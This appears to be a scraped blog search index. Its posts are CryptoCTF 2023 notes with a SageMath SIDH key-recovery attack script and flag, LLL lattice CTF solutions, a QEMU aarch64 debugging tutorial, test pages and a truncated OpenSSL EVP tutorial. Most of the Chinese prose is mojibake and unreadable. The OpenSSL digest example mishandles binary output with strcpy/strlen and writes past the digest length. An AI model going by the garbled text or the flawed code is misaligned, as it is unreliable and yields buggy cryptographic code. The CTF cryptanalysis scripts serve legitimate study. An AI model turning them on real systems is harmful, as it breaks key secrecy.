4651852759096127491733667803074539573102288457512521355046899661762757394431 a = valuation(p + 1, 2) b = valuation(p + 1, 3) F = GF(p ^ 2, \u0026#34;a\u0026#34;, modulus=x ^ 2 + 1) E_start = EllipticCurve(F, [0, 6, 0, 1, 0]) E_start.set_order((p + 1) ^ 2) P, Q, R, S = [E_start(P) for P in (P, Q, R, S)] a2 = 6 a4 = ( 2070374075904221348548347954672740119972290047985052548426161483408084160515 * x + 896749506444795652787374405713981306103783874504413776724865996633074195878 ) a6 = ( 2497300913991521538985990865799426081199023429830552981773916386651958830387 * x + 4243320791854592301388975795466391442631117041175807728844738724691845270777 ) E_end = EllipticCurve(F, [0, a2, 0, a4, a6]) E_end.set_order((p + 1) ^ 2) _phi_P = ( 76437828586489590038329193939006186966443918785230388533883401536928551274 * x + 1854701339851606878866613257086348330205980107370562791121360193846610915298, 3614996124089236146025194675467338095830005859290616536023140003816221458491 * x + 1308394538776387115295908857102539180825411698539070801598965381200026966383, ) _phi_Q = ( 2350346337927935568113772636838467488287314266120334638991371449749383548230 * x + 3389994457403704259291228848441313337916860864318549296438418403582347527289, 3514523396038039657181009561828298688334341559779027220238590888980836781356 * x + 1132784636339236588815425424619354807485262558088269015122405460656452137103, ) phi_P, phi_Q = [E_end(P) for P in (_phi_P, _phi_Q)] P2 = P Q2 = Q P3 = R Q3 = S two_i = generate_distortion_map(E_start) skey = CastryckDecruAttack(E_start, P, Q, E_end, phi_P, phi_Q, two_i, 4) ct = bytes.fromhex( \u0026#34;50d8ed352ccf3ce6d64b25e50ed67b832dcbcd94dcb7dc8293e813e0c83ace541abb61618d5f971ff5d24fab8a2e\u0026#34; ) key = md5(long_to_bytes(skey)).digest() iv = md5(str(skey).encode()).digest() cipher = AES.new(key, AES.MODE_CFB, iv=iv) flag = cipher.decrypt(ct) print(flag) # CCTF{3FfiC!En7_k3Y_R3c0vErY_4tTacK_ON_SIDH!!!} ECDSA LLL attack # https://blog.maple3142.net/2023/07/09/cryptoctf-2023-writeups/#marjan\n","date":"21 September 2023","permalink":"/articles/cryptoctf2023note/","section":"Projects","summary":"https://github.","title":"notes of CryptoCTF 2023 "},{"content":"\rä¸¤ä¸ªæ ¼å¯†ç ç›¸å…³çš„ç‹ æ´» # https://eprint.iacr.org/2021/1007\nå¼ºç½‘æ¯ 2022 Lattice # é€»è¾‘\n$$ C = A \\sdot B \\ \\ (mod \\ n) $$\n$$ B \\to LLL \\to L_x $$\nå·²çŸ¥Cæ±‚Lx\næ„é€ AçŸ©é˜µ\nI æ˜¯å•ä½çŸ©é˜µ\nA = matrix(ZZ,m+r,m+r) for i in range(m): A[i,i] = 1 for i in range(r): for j in range(m): A[j,i+m] = C[i,j]\u0026lt;\u0026lt;200 A[i+m,i+m] = N\u0026lt;\u0026lt;200 $$ A \\to LLL \\to S $$\næ»¡è¶³\nS*Aå¾—åˆ°æœ€å¾—åˆ°çŸ­åŸº\næ­¤æ—¶æœ‰\n$$ B\u0026rsquo; \\sdot C^t+K\\sdot N=0 $$\nå¾—åˆ°çš„Bâ€™å¦‚ä¸‹æ“ä½œå¾—åˆ° Lx\ngraph LR\rB --\u0026gt;|LLL| Lx\rB\u0026#39; --\u0026gt;|kernel_LLL or right_kernel.basis| Lx å·…å³°æå®¢2022 # ç‹ æ´»https://crypto.stackexchange.com/a/70508\né€»è¾‘\nå·²çŸ¥Qæ±‚mï¼Œè¯´å®è¯ï¼Œå¤ªé€†å¤©äº†ã€‚ã€‚ã€‚ã€‚åªè®°å½•æ­¥éª¤\nå¯ä»¥ç†è§£ä¸ºæƒ³åŠæ³•æ„é€ ä¸€ä¸ªæ ¼å­ï¼Œè®©å®ƒçš„è§„çº¦åå¾—åˆ°çš„æœ€çŸ­åŸºç»„çš„ç¬¬ä¸€åˆ—åˆšå¥½ä¸ºm æ‰€ä»¥ä¸Šæ–‡æ‰è¦è½¬ç½®å—23333\nä¸»è¦æ€æƒ³æ˜¯å…ˆæ‰¾Q = D*G\ndiæ˜¯ç”Ÿæˆå…ƒGä¸Qiçš„ç¦»æ•£å¯¹æ•°è§£\nç„¶åæ‰¾ä¸€ä¸ªçŸ©é˜µRä½¿å¾—\nRçš„è®¡ç®—\næ„é€ \nå·¦ä¸Šå¾—åˆ°R\nç”±äºæœ‰\nï¼ˆè¿™ä¹Ÿèƒ½è§£ï¼Ÿï¼‰\næ‰€ä»¥Mçš„æ¯ä¸€åˆ—æ˜¯çŸ©é˜µRçš„å³æ ¸è§£ï¼Œæˆ‘ä»¬è¦æ±‚çš„Mçš„ç¬¬ä¸€åˆ—æ˜¯Rçš„å³æ ¸æ ¼ä¸Šã€‚\næ ¼åŸºè§„çº¦åçš„æ¯è¡Œæ­£äº¤æ€§æ˜¯ä¸å˜çš„ã€‚ä¸”Mçš„ç¬¬ä¸€åˆ—æ˜¯çŸ­å‘é‡ï¼ŒæœŸæœ›å¯¹Ræ±‚å³æ ¸çŸ©é˜µç„¶åè§„çº¦å³å¯è¿˜åŸå‡ºMçš„ç¬¬ä¸€åˆ—ã€‚ï¼ˆæ²¡çœ‹æ‡‚ï¼‰\nM=Matrix(ZZ,74,74) for i in range(73): M[i,i]=1 M[i,-1]=D[i] M[-1,-1]=p R=M.LLL() LK=[] # è¿™æ˜¯åœ¨å–ç»“æœçš„å³æ ¸å—ï¼Ÿ for i in R: if i[-1]!=0: break else: LK.append(i[:-1]) print(len(LK)) # ç”¨Rçš„å³æ ¸è§£M LK=Matrix(ZZ,LK) key=Matrix(ZZ,LK.right_kernel().basis()).LLL()[0] for i in key: print(chr(long_to_bytes(ZZ(i))[-1]),end=\u0026#39;\u0026#39;) https://github.com/ljahum/crypto-challenges/tree/main/2023/2023/LLLstudy\n","date":"21 September 2023","permalink":"/articles/lllstudy2023/","section":"Projects","summary":"","title":"2 examples of CTF LLL crypto in 2023"},{"content":"","date":"9 August 2023","permalink":"/tags/bin/","section":"Tags","summary":"","title":"bin"},{"content":" ç®—æ˜¯äº†å´äº†å¤§äºŒå…¥é—¨kernel pwnæœªæœçš„å¿ƒç»“\nUbuntu 20 qume7.2.4 æºç å®‰è£…qemu # apt intsallç‰ˆæœ¬å¤ªä½\nhttps://www.qemu.org/download/\nwget https://download.qemu.org/qemu-7.2.4.tar.xz tar xvJf qemu-7.2.4.tar.xz cd qemu-7.2.4 ./configure sudo make -j8 # å¤šæ ¸ç¼–è¯‘ sudo make insatll ä¸­é—´ç¼ºä»€ä¹ˆaptç›´æ¥è£…å°±æ˜¯\nmake install å¯èƒ½ä¼šç¯å¢ƒå˜é‡æ·»åŠ å¤±è´¥ï¼Œæ— æ‰€è°“ï¼Œç›´æ¥å¦‚ä¸‹è¿è¡Œ\nsudo /usr/local/test/bin/qemu-aarch64 å®‰è£…mips amd64æ‰€éœ€çš„libcï¼ˆçè£…ä¸€é€šï¼‰\nåœ¨/userä¸‹åº”è¯¥èƒ½æ‰¾åˆ°äº¤å‰ç¼–è¯‘æ‰€éœ€è¦çš„åº“\nqemu\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/ aarch64-linux-gnu/ include/ lib64/ local/ sbin/ bin/ lib/ libexec/ mipsel-linux-gnu/ share/ games/ lib32/ libx32/ mips-linux-gnu/ src/ ljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; ç¼–è¯‘è¿è¡Œ # å†™ä¸ªç©å…·\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(){ printf(\u0026#34;hello world\\ninput ur emotion\\n\u0026#34;); char str[200]; scanf(\u0026#34;%s\u0026#34;,str); printf(\u0026#34;u say : %s\\n\u0026#34;,str); if(!strcmp(str,\u0026#34;hello\u0026#34;)){ printf(\u0026#34;you good\\n\u0026#34;); } else if(!strcmp(str , \u0026#34;end\u0026#34;)){ printf(\u0026#34;you bad\\n\u0026#34;); } // printf(\u0026#34;end\\n\u0026#34;); return 0; } aarch64-linux-gnu-gcc ./main.c -o amd64out -static\nè¿è¡Œ\nljahum@ljahum-vm ~/D/test\u0026gt; ls /usr/aarch64-linux-gnu/ bin/ include/ lib/ ljahum@ljahum-vm ~/D/test\u0026gt; qemu-aarch64 amd64out hello world input ur emotion hello u say : hello you good ljahum@ljahum-vm ~/D/test\u0026gt; file amd64out amd64out: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=84b60fe12f86c039ffcd221a4e32a1c766677293, for GNU/Linux 3.7.0, not stripped ljahum@ljahum-vm ~/D/test\u0026gt; qemuç”¨æˆ·æ¨¡å¼è°ƒè¯• # å…ˆå®‰è£…gdb-multiarch\nsudo apt install gdb-multiarch\nqemuå¯åŠ¨è„šæœ¬\n-L æŒ‡å®šåŠ¨æ€è¿æ¥åº“ä½ç½® æ­¤æ—¶ç”¨äºæ˜¯é™æ€é“¾æ¥ æ‰€ä»¥å¯åŠ å¯ä¸åŠ \n-gæŒ‡å®š æŒ‚è½½ç«¯å£\nqemurun.sh\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ -g 1234 \\ ./amd64out gdbå¯åŠ¨è„šæœ¬\ngdbrun.sh\n#!/bin/bash gdb-multiarch -q ./amd64out -x dbgscript gdb-multiarch è¡Œå†…å‘½ä»¤è„šæœ¬\ndbgscript:\n#dbgscript set architecture aarch64 b main target remote 127.0.0.1:1234 c å…ˆè¿è¡Œqemuå¯åŠ¨è„šæœ¬\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion end u say : end å†è¿è¡Œgdbå¯åŠ¨è„šæœ¬\nljahum@ljahum-vm ~/D/test\u0026gt; sudo ./gdbrun.sh pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list. pwndbg: created $rebase, $ida GDB functions (can be used with print/break) Reading symbols from ./amd64out... (No debugging symbols found in ./amd64out) The target architecture is assumed to be aarch64 Breakpoint 1 at 0x928 warning: remote target does not support file transfer, attempting to access files from local filesystem. 0x0000005502814100 in ?? () from /lib/ld-linux-aarch64.so.1 warning: Could not load shared library symbols for /lib/libc.so.6. Do you need \u0026#34;set solib-search-path\u0026#34; or \u0026#34;set sysroot\u0026#34;? Breakpoint 1, 0x0000005500000928 in main () ------- tip of the day (disable with set show-tips off) ------- Want to NOP some instructions? Use patch \u0026lt;address\u0026gt; \u0026#39;nop; nop; nop\u0026#39; LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ *X0 0x5500010000 â—‚â€” 0x10102464c457f *X1 0x5502812568 â€”â–¸ 0x550281279f â—‚â€” \u0026#39;./amd64out-lib\u0026#39; *X2 0x5502812578 â€”â–¸ 0x55028127ae â—‚â€” \u0026#39;SUDO_GID=0\u0026#39; *X3 0x550000091c (main) â—‚â€” stp x29, x30, [sp, #-0xe0]! X4 0x0 *X5 0xb25a824f20c39041 *X6 0x55029c8b10 â—‚â€” 0x0 *X7 0x1 *X8 0xffffffffffffffff *X9 0xfffffff X10 0x0 X11 0x0 *X12 0x550285ce48 â—‚â€” 0x0 X13 0x0 X14 0x0 *X15 0x6fffff47 *X16 0x1 *X17 0x5502879d28 â—‚â€” 0xb0000a64a9ab7bfd *X18 0x73516240 *X19 0x55000009f8 (__libc_csu_init) â—‚â€” stp x29, x30, [sp, #-0x40]! X20 0x0 *X21 0x5500000810 (_start) â—‚â€” mov x29, #0 X22 0x0 X23 0x0 X24 0x0 X25 0x0 X26 0x0 X27 0x0 X28 0x0 *X29 0x5502812330 â€”â–¸ 0x5502812410 â—‚â€” 0x0 *X30 0x5502879e10 â—‚â€” 0xf9402fe0940055f4 *SP 0x5502812330 â€”â–¸ 0x5502812410 â—‚â€” 0x0 *PC 0x5500000928 (main+12) â—‚â€” ldr x0, [x0, #0xfe0] â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / aarch64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º 0x5500000928 \u0026lt;main+12\u0026gt; ldr x0, [x0, #0xfe0] 0x550000092c \u0026lt;main+16\u0026gt; ldr x1, [x0] 0x5500000930 \u0026lt;main+20\u0026gt; str x1, [sp, #0xd8] 0x5500000934 \u0026lt;main+24\u0026gt; mov x1, #0 0x5500000938 \u0026lt;main+28\u0026gt; adrp x0, #0x5500000000 0x550000093c \u0026lt;main+32\u0026gt; add x0, x0, #0xa98 0x5500000940 \u0026lt;main+36\u0026gt; bl #puts@plt \u0026lt;puts@plt\u0026gt; 0x5500000944 \u0026lt;main+40\u0026gt; add x0, sp, #0x10 0x5500000948 \u0026lt;main+44\u0026gt; mov x1, x0 0x550000094c \u0026lt;main+48\u0026gt; adrp x0, #0x5500000000 0x5500000950 \u0026lt;main+52\u0026gt; add x0, x0, #0xab8 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 00:0000â”‚ x29 sp 0x5502812330 â€”â–¸ 0x5502812410 â—‚â€” 0x0 01:0008â”‚ 0x5502812338 â€”â–¸ 0x5502879e10 â—‚â€” 0xf9402fe0940055f4 02:0010â”‚ 0x5502812340 â—‚â€” 0x0 03:0018â”‚ 0x5502812348 â—‚â€” 0xffffffff 04:0020â”‚ 0x5502812350 â—‚â€” 0x0 05:0028â”‚ 0x5502812358 â€”â–¸ 0x55028678b8 â—‚â€” 0xc001200005b6e /* \u0026#39;n[\u0026#39; */ 06:0030â”‚ 0x5502812360 â€”â–¸ 0x5502846a00 â€”â–¸ 0x5502859000 â—‚â€” 0x3010102464c457f 07:0038â”‚ 0x5502812368 â—‚â€” 0x0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º 0 0x5500000928 main+12 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ pwndbg\u0026gt; æŒ‰ n å•æ­¥å¼€è°ƒ\nè°ƒè¯•åŠ¨æ€é“¾æ¥æ–‡ä»¶ # ä¸æ·»åŠ  -static ç¼–è¯‘\naarch64-linux-gnu-gcc ./main.c -o amd64out-lib\næ­¤æ—¶éœ€è¦ -L æŒ‡å®š /libs ç›®å½•çš„ä½ç½®\n#!/bin/bash sudo /usr/local/test/bin/qemu-aarch64 \\ -L /usr/aarch64-linux-gnu/ \\ ./amd64out-lib ljahum@ljahum-vm ~/D/test\u0026gt; sudo ./qemurun.sh hello world input ur emotion hello u say : hello you good ç³»ç»Ÿæ¨¡å¼ # TO DO\næ¨¡æ‹Ÿè¿è¡ŒARM64æ¶æ„å†…æ ¸ # æœ¬æ¥æƒ³åšä¸ªaarch64è·‘ç³»ç»Ÿæ¨¡å¼ æ²¡æƒ³åˆ°ç¿»åˆ°äº†å†…æ ¸çš„æ–‡ç« \nhttps://blog.csdn.net/weixin_39541632/category_9432131.html\nå®¹æ˜“å‡ºé”™çš„ç‚¹ï¼š\næŒ‚è½½ # $ mkdir -p tmpfs $ sudo mount -t ext4 linux_rootfs.ext4 tmpfs/ -o loop $ sudo cp -af linux_rootfs/* tmpfs/ $ sudo umount tmpfs $ sudo chmod 777 linux_rootfs.ext4 æŒ‚è½½æ‹·è´åœ¨ /root ä¸‹è¿›è¡Œ\nqemu aarch64å¯åŠ¨å‘½ä»¤å†™åˆ° run.shé‡Œé¢ ç»™äºˆæƒé™åè¿è¡Œ\nsudo chmod 777 ./* sudo ./run.sh ç”¨æˆ·åé»˜è®¤root äº¤å‰ç¼–è¯‘ strace å¹¶å®‰è£… # åœ¨rootä¸‹clone strace\nroot@ljahum-vm:~# ls ./strace/ aclocal.m4 config.status LGPL-2.1-or-later README-hacking attic configure m4 README.md AUTHORS configure.ac maint src autom4te.cache COPYING Makefile strace.spec bootstrap CREDITS.in Makefile.am strace.spec.in build-aux debian Makefile.in strace.svg bundled dist NEWS tests ChangeLog-CVS doc README tests-m32 ci INSTALL README-configure tests-mx32 config.log INSTALL-git.md README-github_gitlab-autogenerated-archives.txt tmp.sh root@ljahum-vm:~# pwd /root root@ljahum-vm:~# åœ¨/root ä¸‹è§£å‹gdb\nè§£å‹gdb8çš„å‘½ä»¤\nåœ¨makeå‰çš„\n./configure --host=aarch64-linux-gnu --target=aarch64-linux-gnu --program-prefix=aarch64-linux- \\ --prefix=/home/jiaming/Documents/jailhouse-rpi4/qemu-arm64/gdb-8.0/gdb-build å¯ä»¥æŠŠ\u0026ndash;prefixåé¢çš„ç›®æ ‡ç›®å½•æ¢æˆè‡ªå·±userçš„ç›®å½•\nmake error # å¦‚æœmake installå‡ºç°äº†\nhttps://blog.csdn.net/weixin_44602409/article/details/115716913\nçš„bug1\nä¿®æ”¹ä»¥ä¸‹æ–‡ä»¶\nroot@ljahum-vm:~/gdb-8.0# ls -l ./gdb/nat/linux-ptrace.* -rw-rw-rw- 1 ljahum 200 18011 8æœˆ 10 22:58 ./gdb/nat/linux-ptrace.c -rw-rw-rw- 1 ljahum 200 7709 8æœˆ 10 22:59 ./gdb/nat/linux-ptrace.h root@ljahum-vm:~/gdb-8.0# pwd /root/gdb-8.0 root@ljahum-vm:~/gdb-8.0# linux-ptrace.c\næ³¨é‡Šæ‰\nlinux-ptrace.h\nåŠ å…¥\né‡æ–°make -j8\nå†make install\nmakeinfo not found # sudo apt-get install texinfo\nmakeinfoæ²¡æœ‰å®‰è£…çš„é”™è¯¯\nè¿è¡Œ # ç¼–å†™gdbå¯åŠ¨è„šæœ¬\nç¼–å†™qemuå¯åŠ¨è„šæœ¬\nroot@ljahum-vm:~# vim rungdb.sh root@ljahum-vm:~# vim dbgscript root@ljahum-vm:~# chmod 777 ./* root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat rungdb.sh #!/bin/bash aarch64-linux-gdb ./linux-4.14.221/vmlinux -x dbgscript root@ljahum-vm:~# cat dbgscript target remote localhost:1234 root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run rungdb.sh run.sh root@ljahum-vm:~# cat run.sh /usr/local/test/bin/qemu-system-aarch64 \\ -m 1024 \\ -cpu cortex-a57 \\ -M virt -nographic \\ -smp 4 \\ -kernel linux-4.14.221/arch/arm64/boot/Image \\ -append \u0026#34;noinintrd sched_debug root=/dev/vda rootfstype=ext4 rw crashkernel=256M loglevel=8\u0026#34; \\ -drive if=none,file=linux_rootfs.ext4,id=hd0 \\ -device virtio-blk-device,drive=hd0 \\ -S -s root@ljahum-vm:~# å…ˆè¿è¡Œqemuå†è¿è¡Œgdb\nçœ‹èµ·æ¥éå¸¸ä¸Šæµ\nä¼šçœ‹é•œåƒçš„æˆè‰²\nå®Œå…¨ç¬¦åˆæˆ‘å¯¹Cortex-A57èŠ¯ç‰‡çš„æƒ³è±¡\nroot@lja-PC:~# lscpu Architecture: aarch64 Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 1 Core(s) per socket: 4 Socket(s): 1 NUMA node(s): 1 Vendor ID: ARM Model: 0 Model name: Cortex-A57 Stepping: r1p0 BogoMIPS: 125.00 NUMA node0 CPU(s): 0-3 Flags: fp asimd evtstrm aes pmull sha1 sha2 crc32 cpuid root@lja-PC:~# ifconfig enp0s1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 ether 52:54:00:12:34:56 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 2088 bytes 204552 (199.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2088 bytes 204552 (199.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 root@lja-PC:~# å¯ä»¥ç»™ç½‘å¡é…ç½®å’Œè™šæ‹ŸæœºåŒç½‘æ®µçš„ipæ¥ä¼ æ–‡ä»¶ï¼ˆä½†çœ‹èµ·æ¥ä¸éœ€è¦ï¼‰\n","date":"9 August 2023","permalink":"/articles/qemu021/","section":"Projects","summary":"ç®—æ˜¯äº†å´äº†å¤§äºŒå…¥é—¨kernel pwnæœªæœçš„å¿ƒç»“","title":"qemu from zero 2 hero"},{"content":"","date":"30 July 2023","permalink":"/categories/2023/","section":"Categories","summary":"","title":"2023"},{"content":"","date":"30 July 2023","permalink":"/tags/development/","section":"Tags","summary":"","title":"Development"},{"content":"\rabout # 123123 idï¼šljahum\r@Syclover\néšç¼˜æ’åº\nå¦‚æœä½ å–œæ¬¢å˜‰ç„¶,å“ªæˆ‘ä»¬å°±æ˜¯å¼‚çˆ¶å¼‚æ¯çš„å¥½å…„å¼Ÿ\nprint(ä»£ç æµ‹è¯•) \\(123123\\)\n$123$\n$$ 123123 $$\nIntroduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\n\\(123123\\)\n$$ sdfasdfasd $$\nä¸€ä¸ªèˆ¹æ–°çš„ç«™\n% KaTeX block notation $$ \\varphi = 1+\\frac{1} {1+\\frac{1} {1+\\frac{1} {1+\\cdots} } } $$\n% KaTeX inline notation Inline notation: \\(\\varphi = \\dfrac{1+\\sqrt5}{2}= 1.6180339887â€¦\\)\n","date":"30 July 2023","permalink":"/articles/cntest/","section":"Projects","summary":"about # 123123 idï¼šljahum\r@Syclover","title":"ä¸­æ–‡æµ‹è¯• ä¸­æ–‡æ¸¬è©¦ Chinese test"},{"content":"\rInfo # ã€Œä»¥å‰ã®åå‰ã¯ljahumã§ã™ãŒã€ãƒ™ãƒ¼ã‚³ãƒ³ã¨ã‚‚å‘¼ã‚“ã§ãã ã•ã„ã€‚ã€\nLinux Binary \u0026amp;\u0026amp; Development Cryptography\nlearning Cryptography is too hardï¼ˆpeople vegetable addiction bigï¼‰\ndream job: guitar player with financial freedom\ncontact me:\n1695325350 roomoflja@gmail.com ","date":"20 July 2023","permalink":"/about/","section":"","summary":"Info # ã€Œä»¥å‰ã®åå‰ã¯ljahumã§ã™ãŒã€ãƒ™ãƒ¼ã‚³ãƒ³ã¨ã‚‚å‘¼ã‚“ã§ãã ã•ã„ã€‚ã€","title":"About"},{"content":"","date":"20 July 2023","permalink":"/categories/categories1/","section":"Categories","summary":"","title":"categories1"},{"content":"This section contains all I wrote in 2019-2023\n","date":"15 February 2023","permalink":"/achieve/","section":"archive","summary":"This section contains all I wrote in 2019-2023","title":"archive"},{"content":"","date":"15 February 2023","permalink":"/tags/codes/","section":"Tags","summary":"","title":"codes"},{"content":"\rç®€ä»‹ # EVPç³»åˆ—çš„å‡½æ•°çš„å£°æ˜åŒ…å«åœ¨evp.hé‡Œé¢ å°è£…äº†opensslåŠ å¯†åº“é‡Œé¢æ‰€æœ‰ç®—æ³•çš„å‡½æ•°ã€‚é€šè¿‡è¿™æ ·çš„ç»Ÿä¸€çš„å°è£…ï¼Œä½¿å¾—åªéœ€è¦åœ¨åˆå§‹åŒ–å‚æ•°çš„æ—¶å€™åšå¾ˆå°‘çš„æ”¹å˜ï¼Œå°±å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ä»£ç è°ƒç”¨ä¸åŒçš„åŠ å¯†ç®—æ³•\nctxä¸Šä¸‹æ–‡å¯ä»¥è¢«è®¤ä¸ºæ˜¯é…ç½®é€‰é¡¹ç”Ÿæ•ˆçš„â€œèŒƒå›´â€ã€‚\nåŠ è½½æä¾›è€…æ—¶ï¼Œå®ƒä»…åœ¨ç»™å®šåº“ä¸Šä¸‹æ–‡çš„èŒƒå›´å†…åŠ è½½ã€‚\né€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¤æ‚åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶å¯ä»¥å„è‡ªä½¿ç”¨ä¸åŒçš„åº“ä¸Šä¸‹æ–‡ï¼Œå¹¶è®©ä¸åŒçš„æä¾›ç¨‹åºåŠ è½½ä¸åŒçš„é…ç½®è®¾ç½®ã€‚\nä¸»è¦æ¨¡å—\næ‘˜è¦ EVP_MD\nå¯¹ç§°å¯†ç  EVP_CIPHER\næ¶ˆæ¯éªŒè¯ç  EVP_MAC\nå¯†é’¥æ´¾ç”Ÿå‡½æ•° EVP_KDF\nå¯†é’¥äº¤æ¢ EVP_KEYEXCH\néå¯¹ç§°å¯†ç  EVP_ASYM_CIPHER\nå…¬é’¥å¯†ç (ç›¸æ¯”å¯¹ç§°å¼ºè°ƒç§˜é’¥å’Œç®—æ³•) EVP_PKEY_CTX\néå¯¹ç§°å¯†é’¥å°è£… EVP_KEM\nç¼–ç  OSSL_ENCODER\nopensslå®‰è£… # scoop install openssl æŸ¥çœ‹ç¯å¢ƒå˜é‡\nget-ChildItem env: ... OPENSSL_CONF D:\\Scoop\\apps\\openssl\\current\\bin\\cnf\\openssl.cnf OPENSSL_INCLUDE_DIR D:\\Scoop\\apps\\openssl\\current\\include OPENSSL_LIB_DIR D:\\Scoop\\apps\\openssl\\current\\lib OPENSSL_MODULES D:\\Scoop\\apps\\openssl\\current\\bin makefileé…ç½®(clion)\n#cmake_minimum_required(VERSION 3.24) cmake_minimum_required(VERSION 3.17) project(openssl1 C) set(CMAKE_C_STANDARD 99) set(LINK_DIR $ENV{OPENSSL_LIB_DIR}) set(INC_DIR \u0026#34;D:\\\\Scoop\\\\apps\\\\openssl\\\\current\\\\include\u0026#34;) # æ‰‹åŠ¨é…è·¯å¾„çš„æ–¹æ³• #include_directories($ENV{OPENSSL_INCLUDE_DIR}) ä»ç³»ç»Ÿè¯»è·¯å¾„çš„æ–¹æ³• include_directories(${INC_DIR}) #link_directories($ENV{OPENSSL_LIB_DIR}) link_directories(${LINK_DIR}) link_libraries(openssl libcrypto) add_executable(openssl1 publicKeyEnc.c)#è¿™é‡Œaddçš„æ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ªmain target_link_libraries(openssl1 openssl) openssl evp æ‘˜è¦ç®—æ³• # newä¸€ä¸ªmd ctx ctxåˆå§‹åŒ– æŒ‡å®šæ‘˜è¦ç±»å‹çš„åˆå§‹åŒ– å¯¹æ¶ˆæ¯å¤šæ¬¡æ‘˜è¦ æ‘˜è¦ç»“æŸ è¾“å‡ºç»“æœ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026#34;openssl/evp.h\u0026#34; void test_md5(unsigned char * msg,unsigned char * output){ printf(\u0026#34;start test MD digest\\n\u0026#34;); char * msg1 = msg; unsigned char md_value[EVP_MAX_MD_SIZE]; unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); EVP_MD_CTX_init(pmdctx); EVP_DigestInit(pmdctx,EVP_md5()); //è¯¥å‡½æ•°åŠŸèƒ½è·ŸEVP_DigestInit_exå‡½æ•°åŒæ ·ï¼Œå¯æ˜¯ctx?æ•°èƒ½å¤Ÿä¸ç”¨åˆå§‹åŒ–ï¼Œå¹¶ä¸”è¯¥å‡½æ•°ä»…ä»…ä½¿ç”¨ç¼ºçœå®ç°çš„ç®—æ³•ã€‚ EVP_DigestUpdate(pmdctx,msg1, strlen(msg1)); EVP_DigestFinal(pmdctx,md_value,\u0026amp;md_len); md_value[md_len]= (unsigned char) \u0026#39;\\0\u0026#39;;//åŠ 0æˆªæ–­ //è¿”å›å‚æ•° strcpy(output,md_value); output[strlen(md_value)] = (unsigned char) \u0026#39;\\0\u0026#39;; EVP_MD_CTX_free(pmdctx); //è¯¥å‡½æ•°åŠŸèƒ½è·ŸEVP_DigestFinal_exå‡½æ•°åŒæ 